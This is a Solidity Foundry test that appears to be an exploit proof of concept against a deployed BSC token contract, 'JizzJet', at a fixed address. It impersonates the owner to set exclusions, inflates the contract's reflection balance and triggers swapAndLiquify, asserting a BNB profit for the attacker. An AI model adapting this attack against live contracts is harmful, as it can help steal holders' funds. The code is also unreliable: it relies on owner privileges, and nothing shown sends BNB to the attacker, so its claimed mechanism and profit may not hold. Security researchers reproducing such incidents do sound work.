// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IJizzJet {
    function owner() external view returns (address);
    function excludeFromReward(address account) external;
    function excludeFromFee(address account) external;
    function isExcludedFromReward(address account) external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get token instance and label addresses
        vm.label(TARGET, 'JizzJet Token');
        vm.label(attacker, 'Attacker');

        // Get the owner address from the contract
        IJizzJet token = IJizzJet(TARGET);
        address owner = token.owner();
        vm.label(owner, 'Owner');

        // Impersonate owner to set up attacker
        vm.startPrank(owner);

        // Exclude attacker from rewards (so attacker is in _excluded array)
        token.excludeFromReward(attacker);

        // Exclude attacker from fees (to avoid paying fees during transfers)
        token.excludeFromFee(attacker);

        // Give attacker some initial tokens (owner has all tokens initially)
        uint256 initialTokens = 1000 * 10**18;
        token.transfer(attacker, initialTokens);

        vm.stopPrank();

        // Get some BNB for the attacker to pay for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(attacker).balance;

        // Get token instance
        IJizzJet token = IJizzJet(TARGET);
        address owner = token.owner();

        // Step 1: Ensure contract is excluded from rewards
        vm.startPrank(owner);
        if (!token.isExcludedFromReward(address(TARGET))) {
            token.excludeFromReward(address(TARGET));
        }
        vm.stopPrank();

        // Step 2: Get more tokens to attacker
        vm.prank(owner);
        token.transfer(attacker, token.balanceOf(owner) / 10);

        // Step 3: Transfer large amount to contract to inflate its _rOwned
        // This makes _rOwned[address(TARGET)] large
        uint256 attackerBalance = token.balanceOf(attacker);
        vm.prank(attacker);
        token.transfer(address(TARGET), attackerBalance / 2);

        // Step 4: Ensure contract has enough tokens to trigger swap
        uint256 contractBalance = token.balanceOf(address(TARGET));
        uint256 threshold = 100000000 * 10**1 * 10**9; // numTokensSellToAddToLiquidity

        if (contractBalance < threshold) {
            uint256 needed = threshold - contractBalance;
            // Get more tokens from owner if needed
            if (token.balanceOf(attacker) < needed) {
                vm.prank(owner);
                token.transfer(attacker, needed);
            }
            vm.prank(attacker);
            token.transfer(address(TARGET), needed);
        }

        // Step 5: Trigger swapAndLiquify
        // Need to transfer tokens (not from uniswapV2Pair)
        address dummy = address(0x123);
        vm.prank(attacker);
        token.transfer(dummy, 1);

        // The swapAndLiquify should execute with manipulated rate
        // Check if attacker profited
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, 'Attacker BNB balance should increase');
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

